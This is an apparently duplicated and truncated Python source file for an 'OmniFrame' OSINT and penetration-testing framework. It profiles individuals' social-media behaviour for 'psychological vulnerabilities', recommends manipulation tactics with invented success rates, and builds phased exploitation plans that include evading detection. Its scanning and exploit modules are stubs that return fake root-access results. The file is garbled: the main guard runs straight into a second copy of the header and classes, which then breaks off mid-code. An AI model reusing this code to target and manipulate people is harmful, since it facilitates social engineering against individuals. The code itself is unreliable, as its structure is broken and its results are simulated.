                "description": "Creating time pressure to force quick decisions",
                "implementation": "Limited time offers, impending consequences, scarcity",
                "success_rate": 0.78
            },
            "social_proof": {
                "description": "Using others' behavior to validate actions",
                "implementation": "Testimonials, user counts, popularity indicators",
                "success_rate": 0.85
            },
            "reciprocity": {
                "description": "Creating obligation through giving",
                "implementation": "Free offers, favors, unexpected gifts",
                "success_rate": 0.88
            },
            "liking": {
                "description": "Building rapport and similarity",
                "implementation": "Compliments, shared interests, personal connection",
                "success_rate": 0.79
            }
        }
        return techniques
    
    def analyze_target_behavior(self, target_data: Dict) -> Dict:
        """Analyze target behavior for psychological vulnerabilities"""
        analysis = {
            "vulnerabilities": [],
            "recommended_techniques": [],
            "confidence_score": 0.0,
            "risk_assessment": "low"
        }
        
        # Extract behavioral indicators from target data
        behavioral_indicators = self.extract_behavioral_indicators(target_data)
        
        # Match indicators to known patterns
        for pattern_name, pattern_data in self.behavioral_patterns.items():
            pattern_match = self.assess_pattern_match(behavioral_indicators, pattern_data['indicators'])
            if pattern_match['score'] > 0.5:  # Threshold for significant match
                analysis['vulnerabilities'].append({
                    "pattern": pattern_name,
                    "match_confidence": pattern_match['score'],
                    "indicators_found": pattern_match['matched_indicators']
                })
        
        # Recommend exploitation techniques based on vulnerabilities
        for vulnerability in analysis['vulnerabilities']:
            pattern_name = vulnerability['pattern']
            if pattern_name in self.behavioral_patterns:
                techniques = self.behavioral_patterns[pattern_name]['exploitation_methods']
                for technique in techniques:
                    if technique in self.manipulation_techniques:
                        analysis['recommended_techniques'].append({
                            "technique": technique,
                            "description": self.manipulation_techniques[technique]['description'],
                            "expected_success": self.manipulation_techniques[technique]['success_rate']
                        })
        
        # Calculate overall confidence score
        if analysis['vulnerabilities']:
            analysis['confidence_score'] = sum(
                vuln['match_confidence'] for vuln in analysis['vulnerabilities']
            ) / len(analysis['vulnerabilities'])
            
            # Set risk assessment based on confidence score
            if analysis['confidence_score'] > 0.8:
                analysis['risk_assessment'] = "high"
            elif analysis['confidence_score'] > 0.6:
                analysis['risk_assessment'] = "medium"
            else:
                analysis['risk_assessment'] = "low"
        
        return analysis
    
    def extract_behavioral_indicators(self, target_data: Dict) -> List[str]:
        """Extract behavioral indicators from target data"""
        indicators = []
        
        # Extract from social media activity
        if 'social_media' in target_data:
            for platform, activity in target_data['social_media'].items():
                # Analyze posting frequency
                if 'posting_frequency' in activity:
                    if activity['posting_frequency'] > 10:  # High frequency
                        indicators.append("high engagement")
                    elif activity['posting_frequency'] < 2:  # Low frequency
                        indicators.append("low engagement")
                
                # Analyze content type
                if 'content_types' in activity:
                    if 'opinion' in activity['content_types']:
                        indicators.append("opinion sharing")
                    if 'personal' in activity['content_types']:
                        indicators.append("personal disclosure")
        
        # Extract from communication patterns
        if 'communication' in target_data:
            comm = target_data['communication']
            if 'response_time' in comm:
                if comm['response_time'] < 60:  # Quick responses
                    indicators.append("rapid decision making")
            
            if 'question_count' in comm and comm['question_count'] > 5:
                indicators.append("information seeking")
        
        return indicators
    
    def assess_pattern_match(self, indicators: List[str], pattern_indicators: List[str]) -> Dict:
        """Assess how well indicators match a pattern"""
        matched = [ind for ind in indicators if ind in pattern_indicators]
        score = len(matched) / len(pattern_indicators) if pattern_indicators else 0
        
        return {
            "score": score,
            "matched_indicators": matched,
            "total_possible": len(pattern_indicators)
        }
    
    def generate_exploitation_plan(self, psychological_analysis: Dict) -> Dict:
        """Generate a detailed exploitation plan based on psychological analysis"""
        plan = {
            "phases": [],
            "expected_success_rate": 0.0,
            "timeline": {},
            "contingencies": []
        }
        
        # Calculate expected success rate
        success_rates = []
        for technique in psychological_analysis['recommended_techniques']:
            success_rates.append(technique['expected_success'])
        
        if success_rates:
            plan['expected_success_rate'] = sum(success_rates) / len(success_rates)
        
        # Create exploitation phases
        phases = [
            {
                "name": "Rapport Building",
                "techniques": ["liking", "reciprocity"],
                "duration": "1-3 days",
                "objectives": ["Establish trust", "Create obligation"]
            },
            {
                "name": "Vulnerability Exploitation",
                "techniques": [tech['technique'] for tech in psychological_analysis['recommended_techniques']],
                "duration": "2-5 days",
                "objectives": ["Leverage psychological vulnerabilities", "Achieve primary objectives"]
            },
            {
                "name": "Consolidation",
                "techniques": ["social_proof", "authority"],
                "duration": "1-2 days",
                "objectives": ["Reinforce actions", "Secure outcomes"]
            }
        ]
        
        plan['phases'] = phases
        
        # Add contingencies
        plan['contingencies'] = [
            "Fallback to alternative techniques if resistance encountered",
            "Pivot to different psychological approach if needed",
            "Emergency exit protocol if detected"
        ]
        
        return plan

class ModuleManager:
    """Manager for all framework modules"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.modules = {}
        self.available_modules = {
            "damienz_domain": self.load_damienz_domain,
            "osint_fusion": self.load_osint_fusion,
            "aegis_osint": self.load_aegis_osint,
            "visualization": self.load_visualization,
            "psychological_profiler": self.load_psychological_profiler
        }
        self.load_modules()
    
    def load_modules(self):
        """Load all enabled modules"""
        enabled_modules = self.config.config['modules']['enabled']
        
        for module_name in enabled_modules:
            if module_name in self.available_modules:
                try:
                    self.modules[module_name] = self.available_modules[module_name]()
                    logger.info(f"Successfully loaded module: {module_name}")
                except Exception as e:
                    logger.error(f"Failed to load module {module_name}: {e}")
            else:
                logger.warning(f"Unknown module: {module_name}")
    
    def load_damienz_domain(self):
        """Load Damienz Domain penetration testing module"""
        # This would be the actual implementation from your provided code
        # For this example, we'll create a simplified version
        class DamienzDomainModule:
            def __init__(self):
                self.name = "Damienz Domain"
                self.version = "5.0"
                self.capabilities = [
                    "vulnerability_scanning",
                    "exploitation",
                    "post_exploitation",
                    "exfiltration"
                ]
            
            def scan_target(self, target: str) -> Dict:
                """Simulate target scanning"""
                return {
                    "target": target,
                    "open_ports": [80, 443, 22],
                    "services": {"http": "nginx", "https": "nginx", "ssh": "OpenSSH"},
                    "vulnerabilities": [
                        {"type": "CVE-2021-44228", "severity": "critical", "description": "Log4Shell vulnerability"}
                    ]
                }
            
            def exploit_vulnerability(self, target: str, vulnerability: str) -> Dict:
                """Simulate vulnerability exploitation"""
                return {
                    "target": target,
                    "vulnerability": vulnerability,
                    "success": True,
                    "access_level": "root",
                    "persistence_established": True
                }
        
        return DamienzDomainModule()
    
    def load_osint_fusion(self):
        """Load OSINT Fusion module"""
        # Simplified implementation
        class OSINTFusionModule:
            def __init__(self):
                self.name = "OSINT Fusion"
                self.version = "1.0.0"
                self.capabilities = [
                    "social_media_analysis",
                    "data_correlation",
                    "network_mapping",
                    "entity_extraction"
                ]
            
            def gather_intelligence(self, target: str) -> Dict:
                """Gather OSINT data on target"""
                return {
                    "target": target,
                    "social_media_profiles": ["twitter.com/user1", "facebook.com/user1"],
                    "email_addresses": ["user@example.com"],
                    "associated_domains": ["example.com", "related-site.com"],
                    "behavioral_patterns": ["frequent_poster", "tech_enthusiast"]
                }
        
        return OSINTFusionModule()
    
    def load_aegis_osint(self):
        """Load AEGIS OSINT module"""
        class AEGISOSINTModule:
            def __init__(self):
                self.name = "AEGIS OSINT"
                self.version = "1.0.0"
                self.capabilities = [
                    "subdomain_enumeration",
                    "port_scanning",
                    "cloud_infrastructure_discovery",
                    "vulnerability_assessment"
                ]
            
            def enumerate_subdomains(self, domain: str) -> Dict:
                """Enumerate subdomains"""
                return {
                    "domain": domain,
                    "subdomains": ["www.example.com", "mail.example.com", "api.example.com"],
                    "discovery_methods": ["certificate_transparency", "dns_bruteforce"]
                }
        
        return AEGISOSINTModule()
    
    def load_visualization(self):
        """Load visualization module"""
        class VisualizationModule:
            def __init__(self):
                self.name = "Visualization"
                self.version = "1.0.0"
                self.capabilities = [
                    "network_graphing",
                    "data_mapping",
                    "relationship_analysis",
                    "interactive_dashboards"
                ]
            
            def create_network_graph(self, data: Dict) -> str:
                """Create network visualization"""
                return "Network graph generated successfully"
        
        return VisualizationModule()
    
    def load_psychological_profiler(self):
        """Load psychological profiler"""
        return PsychologicalProfiler(self.config)
    
    def execute_workflow(self, target: str, workflow_type: str = "comprehensive") -> Dict:
        """Execute a predefined workflow"""
        results = {
            "target": target,
            "workflow_type": workflow_type,
            "start_time": datetime.now().isoformat(),
            "modules_executed": [],
            "results": {}
        }
        
        if workflow_type == "comprehensive":
            # OSINT gathering
            if "osint_fusion" in self.modules:
                osint_results = self.modules["osint_fusion"].gather_intelligence(target)
                results["results"]["osint"] = osint_results
                results["modules_executed"].append("osint_fusion")
            
            # Psychological analysis
            if "psychological_profiler" in self.modules and "osint" in results["results"]:
                psych_analysis = self.modules["psychological_profiler"].analyze_target_behavior(
                    results["results"]["osint"]
                )
                results["results"]["psychological_analysis"] = psych_analysis
                results["modules_executed"].append("psychological_profiler")
            
            # Infrastructure scanning
            if "aegis_osint" in self.modules:
                subdomains = self.modules["aegis_osint"].enumerate_subdomains(target)
                results["results"]["infrastructure"] = subdomains
                results["modules_executed"].append("aegis_osint")
            
            # Vulnerability assessment
            if "damienz_domain" in self.modules and "infrastructure" in results["results"]:
                for subdomain in results["results"]["infrastructure"].get("subdomains", []):
                    scan_results = self.modules["damienz_domain"].scan_target(subdomain)
                    if "vulnerability_scans" not in results["results"]:
                        results["results"]["vulnerability_scans"] = []
                    results["results"]["vulnerability_scans"].append(scan_results)
                results["modules_executed"].append("damienz_domain")
        
        results["end_time"] = datetime.now().isoformat()
        results["duration"] = (
            datetime.fromisoformat(results["end_time"]) - 
            datetime.fromisoformat(results["start_time"])
        ).total_seconds()
        
        return results

class OmniFrameCore:
    """Core framework class integrating all components"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.module_manager = ModuleManager(self.config)
        self.psychological_profiler = PsychologicalProfiler(self.config)
        
        # Initialize data stores
        self.target_data = {}
        self.operation_history = []
        self.reports = {}
    
    def add_target(self, target_identifier: str, target_data: Dict = None):
        """Add a new target to the framework"""
        if target_data is None:
            target_data = {
                "identifier": target_identifier,
                "added": datetime.now().isoformat(),
                "last_updated": datetime.now().isoformat(),
                "data_sources": [],
                "vulnerabilities": [],
                "psychological_profile": {},
                "exploitation_plan": {}
            }
        
        self.target_data[target_identifier] = target_data
        self.save_target_data(target_identifier)
        
        return target_identifier
    
    def gather_intelligence(self, target_identifier: str, intensity: str = "normal") -> Dict:
        """Gather intelligence on a target"""
        if target_identifier not in self.target_data:
            self.add_target(target_identifier)
        
        # Execute intelligence gathering workflow
        results = self.module_manager.execute_workflow(target_identifier, "comprehensive")
        
        # Update target data with new intelligence
        self.target_data[target_identifier].update({
            "last_updated": datetime.now().isoformat(),
            "data_sources": results["modules_executed"],
            "intelligence_data": results["results"]
        })
        
        # Perform psychological analysis if OSINT data is available
        if "osint" in results["results"]:
            psych_analysis = self.psychological_profiler.analyze_target_behavior(
                results["results"]["osint"]
            )
            self.target_data[target_identifier]["psychological_profile"] = psych_analysis
            
            # Generate exploitation plan
            exploitation_plan = self.psychological_profiler.generate_exploitation_plan(psych_analysis)
            self.target_data[target_identifier]["exploitation_plan"] = exploitation_plan
        
        self.save_target_data(target_identifier)
        self.operation_history.append({
            "type": "intelligence_gathering",
            "target": target_identifier,
            "time": datetime.now().isoformat(),
            "results": "success" if results else "failed"
        })
        
        return results
    
    def execute_exploitation(self, target_identifier: str, vulnerability: str = None) -> Dict:
        """Execute exploitation against a target"""
        if target_identifier not in self.target_data:
            return {"error": "Target not found"}
        
        target_data = self.target_data[target_identifier]
        
        # If no specific vulnerability provided, use the first one found
        if vulnerability is None and "vulnerability_scans" in target_data.get("intelligence_data", {}):
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                if scan.get("vulnerabilities"):
                    vulnerability = scan["vulnerabilities"][0]["type"]
                    break
        
        if vulnerability is None:
            return {"error": "No vulnerabilities found to exploit"}
        
        # Execute exploitation
        if "damienz_domain" in self.module_manager.modules:
            exploit_result = self.module_manager.modules["damienz_domain"].exploit_vulnerability(
                target_identifier, vulnerability
            )
            
            # Update target data
            if "exploitation_attempts" not in self.target_data[target_identifier]:
                self.target_data[target_identifier]["exploitation_attempts"] = []
            
            self.target_data[target_identifier]["exploitation_attempts"].append({
                "vulnerability": vulnerability,
                "time": datetime.now().isoformat(),
                "result": exploit_result
            })
            
            self.save_target_data(target_identifier)
            self.operation_history.append({
                "type": "exploitation",
                "target": target_identifier,
                "vulnerability": vulnerability,
                "time": datetime.now().isoformat(),
                "result": "success" if exploit_result.get("success") else "failed"
            })
            
            return exploit_result
        
        return {"error": "Exploitation module not available"}
    
    def generate_report(self, target_identifier: str, report_type: str = "comprehensive") -> Dict:
        """Generate a report for a target"""
        if target_identifier not in self.target_data:
            return {"error": "Target not found"}
        
        target_data = self.target_data[target_identifier]
        report_id = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        report = {
            "id": report_id,
            "target": target_identifier,
            "generated": datetime.now().isoformat(),
            "type": report_type,
            "executive_summary": self.generate_executive_summary(target_data),
            "detailed_findings": target_data.get("intelligence_data", {}),
            "psychological_profile": target_data.get("psychological_profile", {}),
            "exploitation_plan": target_data.get("exploitation_plan", {}),
            "recommendations": self.generate_recommendations(target_data)
        }
        
        # Save report
        self.reports[report_id] = report
        self.save_report(report_id)
        
        return report
    
    def generate_executive_summary(self, target_data: Dict) -> Dict:
        """Generate an executive summary"""
        vulnerabilities = []
        if "intelligence_data" in target_data and "vulnerability_scans" in target_data["intelligence_data"]:
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                vulnerabilities.extend(scan.get("vulnerabilities", []))
        
        return {
            "vulnerability_count": len(vulnerabilities),
            "critical_vulnerabilities": len([v for v in vulnerabilities if v.get("severity") == "critical"]),
            "psychological_risk": target_data.get("psychological_profile", {}).get("risk_assessment", "unknown"),
            "exploitation_success_probability": target_data.get("exploitation_plan", {}).get("expected_success_rate", 0)
        }
    
    def generate_recommendations(self, target_data: Dict) -> List[str]:
        """Generate recommendations based on findings"""
        recommendations = []
        
        # Add vulnerability-based recommendations
        if "intelligence_data" in target_data and "vulnerability_scans" in target_data["intelligence_data"]:
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                for vuln in scan.get("vulnerabilities", []):
                    recommendations.append(
                        f"Address {vuln.get('type', 'unknown')} vulnerability on {scan.get('target', 'unknown')}"
                    )
        
        # Add psychological-based recommendations
        psych_profile = target_data.get("psychological_profile", {})
        if psych_profile and "recommended_techniques" in psych_profile:
            for technique in psych_profile["recommended_techniques"]:
                recommendations.append(
                    f"Employ {technique.get('technique', 'unknown')} technique for psychological exploitation"
                )
        
        return recommendations
    
    def save_target_data(self, target_identifier: str):
        """Save target data to secure storage"""
        target_file = self.config.config_dir / "data" / f"{target_identifier}.encrypted"
        try:
            data_json = json.dumps(self.target_data[target_identifier], indent=2)
            encrypted_data = self.config.encrypt_data(data_json)
            with open(target_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving target data: {e}")
            return False
    
    def load_target_data(self, target_identifier: str) -> bool:
        """Load target data from secure storage"""
        target_file = self.config.config_dir / "data" / f"{target_identifier}.encrypted"
        if target_file.exists():
            try:
                with open(target_file, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = self.config.decrypt_data(encrypted_data)
                self.target_data[target_identifier] = json.loads(decrypted_data)
                return True
            except Exception as e:
                logger.error(f"Error loading target data: {e}")
                return False
        return False
    
    def save_report(self, report_id: str):
        """Save report to secure storage"""
        report_file = self.config.config_dir / "reports" / f"{report_id}.encrypted"
        try:
            report_json = json.dumps(self.reports[report_id], indent=2)
            encrypted_data = self.config.encrypt_data(report_json)
            with open(report_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving report: {e}")
            return False

def main():
    """Main entry point for the OmniFrame framework"""
    if not DEPENDENCIES_AVAILABLE:
        print("Error: Required dependencies are not installed.")
        print("Please install dependencies with: pip install requests numpy pandas beautifulsoup4 questionary aiodns python-nmap selenium scikit-learn networkx matplotlib")
        return
    
    print(r"""
     ___    ___   ___  _     ___   ___    ___   ___   ___   ___ 
    / _ \  / __| / __|| |   | _ \ | _ \  / _ \ | _ \ | __| | _ \
   | (_) || (__ | (__ | |__ |  _/ |   / | (_) ||   / | _|  |  _/
    \___/  \___| \___||____||_|   |_|_\  \___/ |_|_\ |___| |_|  
                                                                
    Enterprise-Grade OSINT & Penetration Testing Framework
    """)
    
    # Initialize the framework
    framework = OmniFrameCore()
    
    # Example usage
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Starting comprehensive analysis of {target}...")
        
        # Gather intelligence
        results = framework.gather_intelligence(target)
        print(f"[+] Intelligence gathering completed")
        
        # Generate report
        report = framework.generate_report(target)
        print(f"[+] Report generated: {report['id']}")
        
        # Show executive summary
        print("\nExecutive Summary:")
        print(f"Vulnerabilities found: {report['executive_summary']['vulnerability_count']}")
        print(f"Critical vulnerabilities: {report['executive_summary']['critical_vulnerabilities']}")
        print(f"Psychological risk: {report['executive_summary']['psychological_risk']}")
        print(f"Exploitation success probability: {report['executive_summary']['exploitation_success_probability']:.0%}")
        
        # Save report to file
        report_file = f"{target}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Full report saved to: {report_file}")
    else:
        print("Usage: python omniframe.py <target>")
        print("Example: python omniframe.py example.com")

if __name__ == "__main__":#!/usr/bin/env python3
"""
OMNIFRAME - Enterprise-Grade OSINT & Penetration Testing Framework
Integrated system combining Damienz Domain, OSINT Fusion, AEGIS, and visualization capabilities
"""

import os
import sys
import json
import logging
import asyncio
import threading
import importlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Callable

# Configuration management
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Attempt to import all potential dependencies
try:
    import requests
    import numpy as np
    import pandas as pd
    import dns.resolver
    from bs4 import BeautifulSoup
    import questionary
    from questionary import Style
    import aiodns
    import nmap
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import DBSCAN
    import networkx as nx
    import matplotlib.pyplot as plt
    DEPENDENCIES_AVAILABLE = True
except ImportError as e:
    print(f"Missing dependencies: {e}")
    DEPENDENCIES_AVAILABLE = False

# Try to import GUI components
GUI_AVAILABLE = False
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, filedialog, messagebox
    from PIL import Image, ImageTk
    GUI_AVAILABLE = True
except ImportError:
    pass

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("omniframe_operations.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("OmniFrame")

class ConfigManager:
    """Secure configuration management for the framework"""
    
    def __init__(self, config_dir=".omniframe"):
        self.config_dir = Path.home() / config_dir
        self.config_file = self.config_dir / "config.encrypted"
        self.key_file = self.config_dir / "key.encrypted"
        self.ensure_directories()
        
        # Default configuration
        self.default_config = {
            "version": "1.0.0",
            "modules": {
                "enabled": ["damienz_domain", "osint_fusion", "aegis_osint", "visualization"],
                "damienz_domain": {
                    "aggressiveness": "normal",
                    "timeout": 30,
                    "ports": "1-1000"
                },
                "osint_fusion": {
                    "max_workers": 50,
                    "request_timeout": 30
                },
                "aegis_osint": {
                    "targets_dir": "targets",
                    "wordlists_dir": "wordlists"
                }
            },
            "security": {
                "encryption_enabled": True,
                "auto_update": True,
                "secure_deletion": False
            },
            "api_keys": {
                "shodan": "",
                "hunterio": "",
                "virustotal": "",
                "facebook": "",
                "twitter": ""
            },
            "psychological_profiles": {
                "exploitation_threshold": 0.7,
                "behavioral_patterns": ["fear_response", "curiosity", "trust_vulnerability"],
                "manipulation_techniques": ["authority", "urgency", "social_proof"]
            }
        }
        
        self.config = self.load_config()
    
    def ensure_directories(self):
        """Ensure all necessary directories exist"""
        self.config_dir.mkdir(exist_ok=True, parents=True)
        (self.config_dir / "data").mkdir(exist_ok=True)
        (self.config_dir / "reports").mkdir(exist_ok=True)
        (self.config_dir / "modules").mkdir(exist_ok=True)
        (self.config_dir / "exports").mkdir(exist_ok=True)
    
    def generate_key(self):
        """Generate a new encryption key"""
        return Fernet.generate_key()
    
    def load_key(self):
        """Load or create encryption key"""
        if self.key_file.exists():
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = self.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
    
    def encrypt_data(self, data: str) -> bytes:
        """Encrypt configuration data"""
        key = self.load_key()
        fernet = Fernet(key)
        return fernet.encrypt(data.encode())
    
    def decrypt_data(self, encrypted_data: bytes) -> str:
        """Decrypt configuration data"""
        key = self.load_key()
        fernet = Fernet(key)
        return fernet.decrypt(encrypted_data).decode()
    
    def load_config(self) -> Dict:
        """Load configuration from encrypted file"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = self.decrypt_data(encrypted_data)
                return json.loads(decrypted_data)
            except Exception as e:
                logger.error(f"Error loading config: {e}")
                return self.default_config
        else:
            return self.default_config
    
    def save_config(self):
        """Save configuration to encrypted file"""
        try:
            config_json = json.dumps(self.config, indent=2)
            encrypted_data = self.encrypt_data(config_json)
            with open(self.config_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving config: {e}")
            return False
    
    def get_api_key(self, service: str) -> Optional[str]:
        """Get API key for a service"""
        return self.config['api_keys'].get(service, None)
    
    def update_api_key(self, service: str, key: str):
        """Update API key for a service"""
        self.config['api_keys'][service] = key
        self.save_config()

class PsychologicalProfiler:
    """Advanced psychological profiling for target analysis"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.behavioral_patterns = self.load_behavioral_patterns()
        self.manipulation_techniques = self.load_manipulation_techniques()
    
    def load_behavioral_patterns(self) -> Dict:
        """Load behavioral patterns database"""
        patterns = {
            "fear_response": {
                "indicators": ["rapid decision making", "avoidance behavior", "heightened sensitivity"],
                "exploitation_methods": ["create urgency", "invoke loss aversion", "threat modeling"],
                "effectiveness": 0.85
            },
            "curiosity": {
                "indicators": ["information seeking", "questioning behavior", "exploratory actions"],
                "exploitation_methods": ["information gap creation", "mystery building", "progressive disclosure"],
                "effectiveness": 0.75
            },
            "trust_vulnerability": {
                "indicators": ["acceptance of authority", "low skepticism", "compliance with requests"],
                "exploitation_methods": ["authority assertion", "social proof", "likability building"],
                "effectiveness": 0.90
            },
            "social_conformity": {
                "indicators": ["group following", "opinion alignment", "normative behavior"],
                "exploitation_methods": ["social proof", "group consensus", "normative influence"],
                "effectiveness": 0.80
            }
        }
        return patterns
    
    def load_manipulation_techniques(self) -> Dict:
        """Load manipulation techniques database"""
        techniques = {
            "authority": {
                "description": "Using perceived authority to influence behavior",
                "implementation": "Present as expert, use credentials, authoritative language",
                "success_rate": 0.82
            },
            "urgency": {
                "description": "Creating time pressure to force quick decisions",
                "implementation": "Limited time offers, impending consequences, scarcity",
                "success_rate": 0.78
            },
            "social_proof": {
                "description": "Using others' behavior to validate actions",
                "implementation": "Testimonials, user counts, popularity indicators",
                "success_rate": 0.85
            },
            "reciprocity": {
                "description": "Creating obligation through giving",
                "implementation": "Free offers, favors, unexpected gifts",
                "success_rate": 0.88
            },
            "liking": {
                "description": "Building rapport and similarity",
                "implementation": "Compliments, shared interests, personal connection",
                "success_rate": 0.79
            }
        }
        return techniques
    
    def analyze_target_behavior(self, target_data: Dict) -> Dict:
        """Analyze target behavior for psychological vulnerabilities"""
        analysis = {
            "vulnerabilities": [],
            "recommended_techniques": [],
            "confidence_score": 0.0,
            "risk_assessment": "low"
        }
        
        # Extract behavioral indicators from target data
        behavioral_indicators = self.extract_behavioral_indicators(target_data)
        
        # Match indicators to known patterns
        for pattern_name, pattern_data in self.behavioral_patterns.items():
            pattern_match = self.assess_pattern_match(behavioral_indicators, pattern_data['indicators'])
            if pattern_match['score'] > 0.5:  # Threshold for significant match
                analysis['vulnerabilities'].append({
                    "pattern": pattern_name,
                    "match_confidence": pattern_match['score'],
                    "indicators_found": pattern_match['matched_indicators']
                })
        
        # Recommend exploitation techniques based on vulnerabilities
        for vulnerability in analysis['vulnerabilities']:
            pattern_name = vulnerability['pattern']
            if pattern_name in self.behavioral_patterns:
                techniques = self.behavioral_patterns[pattern_name]['exploitation_methods']
                for technique in techniques:
                    if technique in self.manipulation_techniques:
                        analysis['recommended_techniques'].append({
                            "technique": technique,
                            "description": self.manipulation_techniques[technique]['description'],
                            "expected_success": self.manipulation_techniques[technique]['success_rate']
                        })
        
        # Calculate overall confidence score
        if analysis['vulnerabilities']:
            analysis['confidence_score'] = sum(
                vuln['match_confidence'] for vuln in analysis['vulnerabilities']
            ) / len(analysis['vulnerabilities'])
            
            # Set risk assessment based on confidence score
            if analysis['confidence_score'] > 0.8:
                analysis['risk_assessment'] = "high"
            elif analysis['confidence_score'] > 0.6:
                analysis['risk_assessment'] = "medium"
            else:
                analysis['risk_assessment'] = "low"
        
        return analysis
    
    def extract_behavioral_indicators(self, target_data: Dict) -> List[str]:
        """Extract behavioral indicators from target data"""
        indicators = []
        
        # Extract from social media activity
        if 'social_media' in target_data:
            for platform, activity in target_data['social_media'].items():
                # Analyze posting frequency
                if 'posting_frequency' in activity:
                    if activity['posting_frequency'] > 10:  # High frequency
                        indicators.append("high engagement")
                    elif activity['posting_frequency'] < 2:  # Low frequency
                        indicators.append("low engagement")
                
                # Analyze content type
                if 'content_types' in activity:
                    if 'opinion' in activity['content_types']:
                        indicators.append("opinion sharing")
                    if 'personal' in activity['content_types']:
                        indicators.append("personal disclosure")
        
        # Extract from communication patterns
        if 'communication' in target_data:
            comm = target_data['communication']
            if 'response_time' in comm:
                if comm['response_time'] < 60:  # Quick responses
                    indicators.append("rapid decision making")
            
            if 'question_count' in comm and comm['question_count'] > 5:
                indicators.append("information seeking")
        
        return indicators
    
    def assess_pattern_match(self, indicators: List[str], pattern_indicators: List[str]) -> Dict:
        """Assess how well indicators match a pattern"""
        matched = [ind for ind in indicators if ind in pattern_indicators]
        score = len(matched) / len(pattern_indicators) if pattern_indicators else 0
        
        return {
            "score": score,
            "matched_indicators": matched,
            "total_possible": len(pattern_indicators)
        }
    
    def generate_exploitation_plan(self, psychological_analysis: Dict) -> Dict:
        """Generate a detailed exploitation plan based on psychological analysis"""
        plan = {
            "phases": [],
            "expected_success_rate": 0.0,
            "timeline": {},
            "contingencies": []
        }
        
        # Calculate expected success rate
        success_rates = []
        for technique in psychological_analysis['recommended_techniques']:
            success_rates.append(technique['expected_success'])
        
        if success_rates:
            plan['expected_success_rate'] = sum(success_rates) / len(success_rates)
        
        # Create exploitation phases
        phases = [
            {
                "name": "Rapport Building",
                "techniques": ["liking", "reciprocity"],
                "duration": "1-3 days",
                "objectives": ["Establish trust", "Create obligation"]
            },
            {
                "name": "Vulnerability Exploitation",
                "techniques": [tech['technique'] for tech in psychological_analysis['recommended_techniques']],
                "duration": "2-5 days",
                "objectives": ["Leverage psychological vulnerabilities", "Achieve primary objectives"]
            },
            {
                "name": "Consolidation",
                "techniques": ["social_proof", "authority"],
                "duration": "1-2 days",
                "objectives": ["Reinforce actions", "Secure outcomes"]
            }
        ]
        
        plan['phases'] = phases
        
        # Add contingencies
        plan['contingencies'] = [
            "Fallback to alternative techniques if resistance encountered",
            "Pivot to different psychological approach if needed",
            "Emergency exit protocol if detected"
        ]
        
        return plan

class ModuleManager:
    """Manager for all framework modules"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.modules = {}
        self.available_modules = {
            "damienz_domain": self.load_damienz_domain,
            "osint_fusion": self.load_osint_fusion,
            "aegis_osint": self.load_aegis_osint,
            "visualization": self.load_visualization,
            "psychological_profiler": self.load_psychological_profiler
        }
        self.load_modules()
    
    def load_modules(self):
        """Load all enabled modules"""
        enabled_modules = self.config.config['modules']['enabled']
        
        for module_name in enabled_modules:
            if module_name in self.available_modules:
                try:
                    self.modules[module_name] = self.available_modules[module_name]()
                    logger.info(f"Successfully loaded module: {module_name}")
                except Exception as e:
                    logger.error(f"Failed to load module {module_name}: {e}")
            else:
                logger.warning(f"Unknown module: {module_name}")
    
    def load_damienz_domain(self):
        """Load Damienz Domain penetration testing module"""
        # This would be the actual implementation from your provided code
        # For this example, we'll create a simplified version
        class DamienzDomainModule:
            def __init__(self):
                self.name = "Damienz Domain"
                self.version = "5.0"
                self.capabilities = [
                    "vulnerability_scanning",
                    "exploitation",
                    "post_exploitation",
                    "exfiltration"
                ]
            
            def scan_target(self, target: str) -> Dict:
                """Simulate target scanning"""
                return {
                    "target": target,
                    "open_ports": [80, 443, 22],
                    "services": {"http": "nginx", "https": "nginx", "ssh": "OpenSSH"},
                    "vulnerabilities": [
                        {"type": "CVE-2021-44228", "severity": "critical", "description": "Log4Shell vulnerability"}
                    ]
                }
            
            def exploit_vulnerability(self, target: str, vulnerability: str) -> Dict:
                """Simulate vulnerability exploitation"""
                return {
                    "target": target,
                    "vulnerability": vulnerability,
                    "success": True,
                    "access_level": "root",
                    "persistence_established": True
                }
        
        return DamienzDomainModule()
    
    def load_osint_fusion(self):
        """Load OSINT Fusion module"""
        # Simplified implementation
        class OSINTFusionModule:
            def __init__(self):
                self.name = "OSINT Fusion"
                self.version = "1.0.0"
                self.capabilities = [
                    "social_media_analysis",
                    "data_correlation",
                    "network_mapping",
                    "entity_extraction"
                ]
            
            def gather_intelligence(self, target: str) -> Dict:
                """Gather OSINT data on target"""
                return {
                    "target": target,
